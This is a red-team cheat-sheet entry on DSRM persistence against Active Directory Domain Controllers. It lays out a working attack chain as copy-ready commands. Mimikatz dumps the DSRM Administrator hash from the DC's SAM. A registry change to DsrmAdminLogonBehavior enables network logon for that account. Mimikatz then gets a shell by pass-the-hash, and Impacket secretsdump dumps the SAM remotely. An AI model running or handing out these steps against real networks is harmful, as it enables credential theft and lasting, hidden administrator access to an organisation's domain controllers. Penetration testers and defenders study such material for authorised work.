---
technique: DSRM Persistence
category: persistence
targets: Domain Controllers
protocols: SMB, NTLM
remote_capable: true
tags: persistence dsrm local-admin domain-controller registry ntlm pth mimikatz
---

# DSRM Persistence

Every Domain Controller has a local Directory Services Restore Mode (DSRM) Administrator account with a password set at promotion time that is rarely rotated. By modifying the `DsrmAdminLogonBehavior` registry key on the DC to value `2`, an attacker can authenticate with this local account over the network at any time. The DSRM password hash survives domain credential rotations.

## Windows

Mimikatz dumps the DSRM hash from SAM, and a registry key change enables network logon.

### Step 1: Dump DSRM hash (Mimikatz)

#powershell #mimikatz #sam-dump

Dump the local SAM database on the DC to extract the DSRM Administrator hash using Mimikatz.

```powershell title:"Dump DSRM Administrator hash from DC SAM with Mimikatz"
.\mimikatz.exe "token::elevate" "lsadump::sam"
```
<!-- cheat -->

### Step 2: Enable DSRM network logon (registry)

#powershell #registry

Set the DsrmAdminLogonBehavior registry key to 2 to allow the DSRM account to authenticate over the network.

```powershell title:"Enable DSRM network logon via registry key"
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
<!-- cheat -->

### Step 3: Authenticate as DSRM Administrator (Mimikatz)

#powershell #mimikatz #pth

Spawn a shell authenticated as the DSRM Administrator using pass-the-hash via Mimikatz.

```powershell title:"Pass-the-hash as DSRM Administrator using Mimikatz"
.\mimikatz.exe "sekurlsa::pth /domain:$dc_name /user:Administrator /ntlm:$nt_hash /run:powershell.exe"
```
<!-- cheat
var dc_name
var nt_hash
-->

## Linux

After extracting the DSRM hash from the DC (e.g. via secretsdump with DA credentials), pass-the-hash tools can authenticate with it remotely once the registry key is enabled.

### secretsdump (extract DSRM hash)

#python #impacket #sam-dump

Dump the local SAM database from the DC to extract the DSRM Administrator hash.

```sh title:"Dump DC SAM database with secretsdump to extract DSRM hash"
secretsdump.py "$domain"/"$user":"$pass"@"$rhost_ip" -sam
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->
